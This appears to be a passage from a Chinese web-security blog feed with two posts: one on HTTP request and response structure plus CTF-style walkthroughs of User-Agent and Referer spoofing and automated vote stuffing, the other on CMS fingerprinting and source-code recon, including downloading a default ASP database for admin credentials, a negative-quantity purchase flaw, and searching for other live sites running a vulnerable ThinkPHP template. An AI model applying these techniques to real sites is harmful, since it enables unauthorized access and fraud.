<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Request Headers</span><br><span class="line">POST /adduser HTTP/1.1</span><br><span class="line">Host: localhost:8030</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Origin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcm</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/66.0.3359.181 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line"># Form Data</span><br><span class="line">name=name&amp;age=11</span><br></pre></td></tr></table></figure>

<h2 id="4-1-请求行"><a href="#4-1-请求行" class="headerlink" title="4.1 请求行"></a>4.1 请求行</h2><p>&emsp;&emsp;请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分隔</p>
<p>&emsp;&emsp;例如：GET /index.html HTTP/1.1  </p>
<p>&emsp;&emsp;HTTP规划定义了8种可能的请求方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：检索URL中标识资源的一个简单请求</span><br><span class="line">HEAD：与GET方法相同，服务器只返回状态行和头标，并不返回请求文档</span><br><span class="line">POST：服务器接收被写入客户端输出流中的数据的请求</span><br><span class="line">PUT：服务器保存请求数据作为指定URL新内容的请求</span><br><span class="line">DELETE：服务器删除URL中命令的资源的请求</span><br><span class="line">OPTIONS：关于服务器支持的请求方法信息的请求</span><br><span class="line">TRACE：Web服务器反馈HTTP请求和其头标的请求</span><br><span class="line">CONNECT：已文档化，但当前未实现的一个方法，预留做隧道处理</span><br></pre></td></tr></table></figure>

<h2 id="4-2-请求头"><a href="#4-2-请求头" class="headerlink" title="4.2 请求头"></a>4.2 请求头</h2><p>由关键字/值对组成，每行一对，关键字和值用冒号分隔。请求头标通知服务器腾于客户端的功能和标识。</p>
<ul>
<li><strong>HOST:</strong> 主机或域名地址 </li>
<li><strong>Accept：</strong>指浏览器或其他客户可以接受的 MIME 文件格式。Servlet 可以根据它判断并返回适当的文件格 式。 </li>
<li><strong>User-Agent：</strong>是客户浏览器名称 </li>
<li><strong>Host：</strong>对应网址 URL 中的 Web 名称和端口号。 </li>
<li><strong>Accept-Langeuage：</strong>指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 </li>
<li><strong>Connection：</strong>用来告诉服务器是否可以维持固定的 HTTP 连接。<strong>HTTP 是无连接的</strong>，HTTP/1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时（比如一个 HTML 文件和相关的图形文件），不需要每次都建立连接 </li>
<li><strong>Cookie：</strong>浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。 </li>
<li><strong>X-Forwarded-For：</strong>是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</li>
<li><strong>X-Real-IP：</strong>一般只记录真实发出请求的客户端IP</li>
<li><strong>Referer：</strong>表明产生请求的网页URL。如比从网页 <a href="/icconcept/index.jsp">/icconcept/index.jsp</a> 中点击一个链接到网页 <a href="/icwork/search">/icwork/search</a> ，在向服务器发送的 GET /icwork/search 中的请求中，Referer是 <a href="http://hostname:8080/icconcept/index.jsp">http://hostname:8080/icconcept/index.jsp</a> ，这个属性可以用来跟踪Web请求是从什么网站来的。（比如一些邀请链接就是通过Referer头来判别走的是谁的邀请，购买了什么商品，对邀请人进行奖励）</li>
<li><strong>Content-Type：</strong>用来表明 Request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 </li>
<li><strong>Accept-Charset：</strong>指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. </li>
<li><strong>Accept-Encoding：</strong>指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。</li>
<li><strong>空行：</strong>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。 </li>
<li><strong>请求数据：</strong>使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。</li>
</ul>
<h1 id="五、Respones返回数据包数据格式"><a href="#五、Respones返回数据包数据格式" class="headerlink" title="五、Respones返回数据包数据格式"></a>五、Respones返回数据包数据格式</h1><p>​    一个响应由四个部分组成：状态行、响应头标、空行、响应数据。 </p>
<ul>
<li><p><strong>状态行：</strong>协议版本、数字形式的状态代码和状态描述，每个元素之间以空格分隔 </p>
</li>
<li><p><strong>响应头标：</strong>包含服务器类型、日期、长度、内容类型等 </p>
</li>
<li><p><strong>空行：</strong>响应头与响应体之间用空行隔开 </p>
</li>
<li><p><strong>响应数据：</strong>浏览器会将实体内容中的数据取出来，生成相应的页面</p>
</li>
</ul>
<ul>
<li><p>HTTP 响应码： </p>
<ul>
<li><strong>1xx：</strong>信息，请求收到，继续处理 </li>
<li><strong>2xx：</strong>成功，行为被成功地接受、理解和采纳 </li>
<li><strong>3xx：</strong>重定向，为了完成请求，必须进一步执行的动作 </li>
<li><strong>4xx：</strong>客户端错误 </li>
<li><strong>5xx：</strong>服务器错误</li>
</ul>
<p>判断文件（夹）是否存在</p>
<ul>
<li><p><strong>200</strong> 存在文件</p>
</li>
<li><p><strong>3xx</strong> 均可能存在</p>
</li>
<li><p><strong>403</strong> 存在文件夹</p>
</li>
</ul>
<ul>
<li><strong>404</strong> 不存在文件及文件夹</li>
<li><strong>500</strong> 均可能存在</li>
<li>因此在扫描网站后台时最好这三个选项都选上</li>
</ul>
</li>
</ul>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630582387031-e39f1241-1f9b-4aaf-9c68-e07123f7b7a7.png" alt="image.png"></p>
<ul>
<li><p>响应头标：像请求头标一样，它们指出服务器的功能，标识出响应数据的细节</p>
</li>
<li><p>空行：最后一个响应头标之后是一个空行，发送回车符和退行，表明服务器以下不再有头标</p>
</li>
<li><p>响应数据：HTML文档和图像等，也就是HTML本身</p>
</li>
</ul>
<h1 id="六、例子"><a href="#六、例子" class="headerlink" title="六、例子"></a>六、例子</h1><h2 id="6-1-第三方检测修改实现XSS攻击"><a href="#6-1-第三方检测修改实现XSS攻击" class="headerlink" title="6.1 第三方检测修改实现XSS攻击"></a>6.1 第三方检测修改实现XSS攻击</h2><p>&emsp;&emsp;之前某长之家的IP查询功能页面，因为会通过数据包获取User-Agent信息并显示在网页上，而没有采取防御措施，因此有XSS漏洞，目前已修复</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002740481.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002715493.png" alt="image.png"></p>
<h2 id="6-2-CTF或实际应用中部分考题解析（mozhe）"><a href="#6-2-CTF或实际应用中部分考题解析（mozhe）" class="headerlink" title="6.2 CTF或实际应用中部分考题解析（mozhe）"></a>6.2 CTF或实际应用中部分考题解析（mozhe）</h2><h3 id="6-2-1-浏览器信息伪造"><a href="#6-2-1-浏览器信息伪造" class="headerlink" title="6.2.1 浏览器信息伪造"></a>6.2.1 浏览器信息伪造</h3><p>&emsp;&emsp;背景介绍：小墨了解到从微信6.0开始，其内嵌的浏览器在User Agent字符串中增加了NetType字段用于标识客户端（手机）当前的网络环境，增加之后真的安全吗？  </p>
<p>&emsp;&emsp;解题方向： 根据页面提示，抓包分析除了判断浏览器类型还判断了微信特有的NetType</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590160405-96a77c4a-04ad-4e78-acde-7f1480360654.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204002943832.png" alt="image.png"></p>
<p>&emsp;&emsp;查阅资料发现符合的User-Agent：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630589984309-a1cd1d42-e840-44d5-84a2-658bec61ac0a.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590246964-dec0cada-67e8-458f-ab15-e1d49724dee9.png" alt="image.png"></p>
<p>&emsp;&emsp;KEY： mozhe1540417e23d339b162b1bbe84c9  </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590449601-6395ce00-5d15-426a-b139-f8917fa52c4c.png" alt="image.png"></p>
<h3 id="6-2-2-投票常见漏洞分析溯源"><a href="#6-2-2-投票常见漏洞分析溯源" class="headerlink" title="6.2.2 投票常见漏洞分析溯源"></a>6.2.2 投票常见漏洞分析溯源</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630590610448-8bf38ef9-d69a-4b0c-998d-378938d39a30.png" alt="image.png"></p>
<p>&emsp;&emsp;随便投一票，发现说要微信打开</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591209350-92ed9d7b-639f-4af2-9094-7d3466aa7e6d.png" alt="image.png"></p>
<p>&emsp;&emsp;查阅资料知道微信的User-agent有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Linux; U; Android 5.0.2; zh-cn; MI 2C Build/LRX22G) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/5.4 TBS/025469 Mobile Safari/533.1 MicroMessenger/6.2.5.53_r2565f18.621 NetType/WIFI Language/zh_CN</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;使用微信的User-Agent后，投票成功</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591250818-899f9e23-1511-4cce-8fd7-beeb6c132c3f.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211204003313408.png" alt="image.png"></p>
<p>&emsp;&emsp;使用Repeater再次进行一遍，无误</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591402410-b006ecb0-f7b6-446c-9c7e-02925c77914d.png" alt="image.png"></p>
<p>&emsp;&emsp;使用Intruder疯狂投票吧！</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591464881-f13c8d47-dc96-4e02-8da3-b7f6ac4d5ebb.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591492701-8436708a-4bd7-4225-94a5-8a3f1b329b9b.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591511008-c4262ba6-2bbd-4cbb-a82d-5c96faf11b19.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591524853-d073c65c-bd75-45d2-935f-0df67fa822cf.png" alt="image.png"></p>
<p>&emsp;&emsp;差不多就可以停了，KEY：mozhece264154fdee3bfe3040b0c3ba1</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591573893-8d4ed94e-a54a-4043-91f4-0be0ed4b3f76.png" alt="image.png"></p>
<h3 id="6-2-3-来源页伪造"><a href="#6-2-3-来源页伪造" class="headerlink" title="6.2.3 来源页伪造"></a>6.2.3 来源页伪造</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591766174-e29a1e9f-516a-4436-83ec-c788d848c31c.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591810029-707a9611-66fd-4536-9711-0851586bcd0f.png" alt="image.png"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630591825055-86ab59d0-0a3f-406b-8314-91f23dbe472e.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Web源码拓展</title>
    <url>/post/de8a59bf.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为后期的安全测试提供了更多的思路。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626009190194-959ddb49-0e3e-4e9c-824e-8356fe945d9c.png" alt="img"></p>
<h1 id="二、关于Web源码目录结构"><a href="#二、关于Web源码目录结构" class="headerlink" title="二、关于Web源码目录结构"></a>二、关于Web源码目录结构</h1><p>&emsp;&emsp;数据库配置文件，后台目录，模板目录，数据库目录等</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">index.php 根据文件后缀判定</span><br><span class="line">admin 网站后台路径</span><br><span class="line">data 数据相关目录</span><br><span class="line">install 安装目录</span><br><span class="line">member 会员目录</span><br><span class="line">template 模板目录(和网站相关的整体架构)</span><br><span class="line">data =&gt; confing.php 数据库配置文件，网站和数据库的通讯信息，连接账号密码，可以去连接对方数据库，从数据库去得到这个网站的源码里面涉及到的管理员的账号密码。</span><br></pre></td></tr></table></figure>

<h1 id="三、关于Web源码脚本类型"><a href="#三、关于Web源码脚本类型" class="headerlink" title="三、关于Web源码脚本类型"></a>三、关于Web源码脚本类型</h1><p>&emsp;&emsp;ASP，PHP，ASPX，JSP，JAVAWEB等脚本类型源码安全问题</p>
<h1 id="四、关于Web源码应用分类"><a href="#四、关于Web源码应用分类" class="headerlink" title="四、关于Web源码应用分类"></a>四、关于Web源码应用分类</h1><p>&emsp;&emsp;社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞</p>
<p>&emsp;&emsp;开源，未开源问题， 框架非框架问题，关于CMS识别问题及后续等</p>
<p>&emsp;&emsp;拿到对方的源码或者判断这个网站的应用类型之后应该侧重在哪些漏洞上做文章</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">门户网站------------------------综合类漏洞</span><br><span class="line">电商------------------------------业务逻辑漏洞</span><br><span class="line">论坛------------------------------XSS漏洞</span><br><span class="line">博客------------------------------漏洞较少</span><br><span class="line">第三方---------------------------根据功能决定</span><br></pre></td></tr></table></figure>

<h1 id="五、关于Web源码其他说明"><a href="#五、关于Web源码其他说明" class="headerlink" title="五、关于Web源码其他说明"></a>五、关于Web源码其他说明</h1><h2 id="1、框架与非框架"><a href="#1、框架与非框架" class="headerlink" title="1、框架与非框架"></a>1、框架与非框架</h2><p>&emsp;&emsp;如果对方网站采用的是框架开发的话那么你面对的就是寻找框架的漏洞，如果是非框架的话寻找的漏洞针对的是代码写出来的漏洞（代码审计）</p>
<p>&emsp;&emsp;比如：thinkPHP漏洞</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293351122-9dbf0276-75c9-45eb-a615-80b48801c33c.png" alt="img"></p>
<h2 id="2、CMS识别"><a href="#2、CMS识别" class="headerlink" title="2、CMS识别"></a>2、CMS识别</h2><h3 id="（1）CMS的概念"><a href="#（1）CMS的概念" class="headerlink" title="（1）CMS的概念"></a>（1）CMS的概念</h3><p>&emsp;&emsp;CMS是Content Management System的缩写，意为”内容管理系统”。 内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场。 内容管理系统组成要素</p>
<ul>
<li><p>文档模板</p>
</li>
<li><p>脚本语言或标记语言</p>
</li>
<li><p>与数据库集成</p>
</li>
</ul>
<h3 id="（2）CMS识别方法"><a href="#（2）CMS识别方法" class="headerlink" title="（2）CMS识别方法"></a>（2）CMS识别方法</h3><h4 id="①-人工识别"><a href="#①-人工识别" class="headerlink" title="① 人工识别"></a>① 人工识别</h4><p>&emsp;&emsp;直接看出来</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293980513-4a2c0f3b-aae7-4b9f-bdde-fc37fa630102.png" alt="img"></p>
<h4 id="②-CMS识别在线工具"><a href="#②-CMS识别在线工具" class="headerlink" title="② CMS识别在线工具"></a>② CMS识别在线工具</h4><p>&emsp;&emsp;在线cms指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293657770-654bae62-7305-4d56-9102-c9dab166728c.png" alt="img"></p>
<p>&emsp;&emsp;云悉：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631293692731-0fe7d591-52b7-4566-a8aa-a1d96fb61214.png" alt="img"></p>
<h4 id="③-工具"><a href="#③-工具" class="headerlink" title="③ 工具"></a>③ 工具</h4><p><strong>使用字典</strong></p>
<p>&emsp;&emsp;因为每个文件都有个特定的md5值，我们可以通过访问一个网站的文件，保存到本地后，查看该文件的md5值，和字典中的md5值进行比较，如果相同，说明该网站的cms对应字典上该条记录的cms</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631322562277-e6883691-ab81-4f74-a27e-6b6a7bedb2a9.png" alt="img"></p>
<p>&emsp;&emsp;查看文件MD5等值的命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt MD5</span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt SHA1</span><br><span class="line"></span><br><span class="line">certutil <span class="literal">-hashfile</span> D:\file.txt SHA256</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;假设访问这个网站：<a href="http://192.168.1.105:8032/%EF%BC%8C%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AEhttp://192.168.1.105:8032/favicon.ico">http://192.168.1.105:8032/，尝试访问http://192.168.1.105:8032/favicon.ico</a> ，的确存在该图标，将该图标文件保存到本地</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323530035-7fff5410-b4cd-47fa-80de-c5c505c3d6d3.png" alt="img"></p>
<p>&emsp;&emsp;生成该文件的md5值：<code>certutil -hashfile favico.ico md5</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323446326-e24e27f0-280f-4a59-934e-554ef9db4815.png" alt="img"></p>
<p>&emsp;&emsp;在字典中查询md5值，发现有记录，该CMS对应的是metinfo，正确</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631323410923-9af97530-9da8-47b4-b11b-101660153a48.png" alt="img"></p>
<p>&emsp;&emsp;字典链接：<a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></p>
<h1 id="六、开源或内部"><a href="#六、开源或内部" class="headerlink" title="六、开源或内部"></a>六、开源或内部</h1><p>&emsp;&emsp;开源：去网上找寻漏洞文章。直接找漏洞或审计（可以通过CMS识别出来的）</p>
<p>&emsp;&emsp;内部：常规的渗透测试，用扫描工具去判断。（找不到源码或者不知道对方的CMS名称）</p>
<h1 id="七、源码获取"><a href="#七、源码获取" class="headerlink" title="七、源码获取"></a>七、源码获取</h1><ul>
<li><p>扫描工具探测备份文件</p>
</li>
<li><p>CMS识别技术获取CMS名称然后从网上下载</p>
</li>
<li><p>百度直接搜索：源码</p>
</li>
<li><p>咸鱼上会有卖</p>
</li>
<li><p>第三方源码站：比如菜鸟源码</p>
</li>
<li><p>各种行业对应</p>
</li>
</ul>
<h1 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h1><p>&emsp;&emsp;关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想办法获取。</p>
<h1 id="九、演示案例"><a href="#九、演示案例" class="headerlink" title="九、演示案例"></a>九、演示案例</h1><h2 id="1、ASP-PHP-等源码下安全测试"><a href="#1、ASP-PHP-等源码下安全测试" class="headerlink" title="1、ASP,PHP 等源码下安全测试"></a>1、ASP,PHP 等源码下安全测试</h2><p>&emsp;&emsp;平台识别-某 CMS 无漏洞-默认数据库 </p>
<p>&emsp;&emsp;平台识别-某 CMS 有漏洞-漏洞利用  </p>
<h3 id="（1）xycms搬家公司登入后台"><a href="#（1）xycms搬家公司登入后台" class="headerlink" title="（1）xycms搬家公司登入后台"></a>（1）xycms搬家公司登入后台</h3><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631318967273-2dc4af7d-3873-4042-b9a2-36b5d013ba75.png" alt="img"></p>
<p>&emsp;&emsp;访问该网站，随便点点，观察URL可知，该网站应该是用asp语言做的</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631319101337-fbd0d592-a2a8-4ed2-899a-63b9e2e09b14.png" alt="img"></p>
<p>&emsp;&emsp;同时可以看到该网站的CMS为xycms</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631319138909-9878e8f5-8f3a-456f-9bc3-f918c7a0a28d.png" alt="img"></p>
<p>&emsp;&emsp;搜索XYCMS源码，下载<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251325-0a1c3d68-4ee9-4a02-ac2a-185f7c170855.png" alt="img"><br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251397-63f82ad0-d665-4b1c-9c5a-ac8cb3d5aa6f.png" alt="img"></p>
<p>&emsp;&emsp;打开文件夹，寻找关键数据库路径文件xydata，找到文件xycms.mdb(asp特有文件)<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251489-84bd6b91-4334-4ff3-8450-dfd3bc6bd2f3.png" alt="img"><br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251565-12ea2248-7af3-4fd5-b032-75729ec3d675.png" alt="img"></p>
<p>&emsp;&emsp;该文件存有管理员的账号密码<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251635-80713ae0-85bb-4ef1-b23a-8865a00cd5fc.png" alt="img"></p>
<p>&emsp;&emsp;根据下载的源码路径，可以去尝试访问网站的目录： <a href="http://192.168.139.137:8003/xydata/xycms.mdb,">http://192.168.1.105:8003/xydata/xycms.mdb,</a>下载到文件<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251712-a9b04891-e869-41e7-90af-7036c4a05ac2.png" alt="img"></p>
<p>&emsp;&emsp;尝试访问到后台<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1626010251784-b3d8a32d-d9cc-4bec-b8ad-dfa220537c33.png" alt="img"></p>
<p>&emsp;&emsp;数据库中admin数据 密码MD5解密<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631321110166-9fce48ff-8b26-4c45-91a1-8ee7c7219d1e.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631321136261-04fdccac-ae06-4424-9c5d-59debd5a8528.png" alt="img"></p>
<p>&emsp;&emsp;使用用户密码即可登录<br><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631320610761-b9b2c3a5-461b-406d-8896-361d5b601caf.png" alt="img"></p>
<h2 id="2、源码应用分类下的针对漏洞"><a href="#2、源码应用分类下的针对漏洞" class="headerlink" title="2、源码应用分类下的针对漏洞"></a>2、源码应用分类下的针对漏洞</h2><h3 id="（1）-niushop电商类关注漏洞点-业务逻辑"><a href="#（1）-niushop电商类关注漏洞点-业务逻辑" class="headerlink" title="（1） niushop电商类关注漏洞点-业务逻辑"></a>（1） niushop电商类关注漏洞点-业务逻辑</h3><p>&emsp;&emsp;买东西时，数量为一，提交的时候抓包，将数量改为-1，数量不可能为-1，因此白嫖</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631330648147-035b4214-db4d-464f-91ff-ca8d783b14e5.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631330675534-fd70a06f-630f-4c73-9561-0e43837b3313.png" alt="img"></p>
<h2 id="3、简要目标从识别到源码获取"><a href="#3、简要目标从识别到源码获取" class="headerlink" title="3、简要目标从识别到源码获取"></a>3、简要目标从识别到源码获取</h2><h3 id="（1）本地演示个人博客-手工发现其-CMS-漏洞搜索或下载分析"><a href="#（1）本地演示个人博客-手工发现其-CMS-漏洞搜索或下载分析" class="headerlink" title="（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析"></a>（1）本地演示个人博客-手工发现其 CMS-漏洞搜索或下载分析</h3><p>&emsp;&emsp;比如这个博客，复制到获取的某些文件的路径到搜索引擎中搜索，可以知道该网站的CMS为ZBlog</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631331534475-7924a9d1-3098-4b3c-b0d1-efe6c440b690.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332135683-afa2fa70-fef1-4d60-99c8-f36546c4d387.png" alt="img"></p>
<h3 id="（2）人工爆框架-搜索特定-url-获取其他相符站点-漏洞测试"><a href="#（2）人工爆框架-搜索特定-url-获取其他相符站点-漏洞测试" class="headerlink" title="（2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试"></a>（2）人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试</h3><p>&emsp;&emsp;<a href="http://weipan.1016sangshen.cn/">http://weipan.1016sangshen.cn/</a> 内部搭建的靶场</p>
<p>&emsp;&emsp;这是最近一个非法网站币圈的网站，是真实的，这套源码都还有其他人在用</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332275635-61d791a4-b1fc-42e7-9cf9-6118f9ab55a1.png" alt="img"></p>
<p>&emsp;&emsp;可以看到为ThinkPhp</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332332157-940dc439-61e2-4217-8307-bcc93a6dba79.png" alt="img"></p>
<p>&emsp;&emsp;将URL放入工具中，存在漏洞，后续针对漏洞进行攻击即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333207781-cec32b62-3834-442e-8977-4c8c10ad2bb3.png" alt="img"></p>
<p>&emsp;&emsp;利用搜索引擎搜索该网站URL一栏上的：<code>index/login/login/token</code></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631332275635-61d791a4-b1fc-42e7-9cf9-6118f9ab55a1.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333326437-92ae4783-6a8a-4ece-9d67-3b5e33703c36.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333399106-017b0716-3304-4bf2-aa5d-543df4995d61.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333414746-cb9977da-a138-43ea-bbd1-72814c952a9e.png" alt="img"></p>
<p>&emsp;&emsp;这个就是跟之前的模板一模一样的，放入工具中，存在漏洞</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333457287-38de9029-1f2a-498c-9cf8-17f7f47558db.png" alt="img"></p>
<p>&emsp;&emsp;这个也是</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333548325-8185638d-727d-4167-827a-583ee86c131b.png" alt="img"></p>
<h3 id="（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他"><a href="#（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他" class="headerlink" title="（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他"></a>（3）借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他</h3><p>&emsp;&emsp;菜鸟源码中，搜索微盘，就有好多这种模板的源码</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333761353-6247f4ac-402a-44ab-84a0-ea78bbc597ed.png" alt="img"></p>
<p>&emsp;&emsp;闲鱼</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1631333921226-e728f653-4777-4a9d-8022-974c2a923a22.png" alt="img"></p>
<h1 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h1><p>&emsp;&emsp;Github监控器：<a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></p>
<p>&emsp;&emsp;大佬的博客：<a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
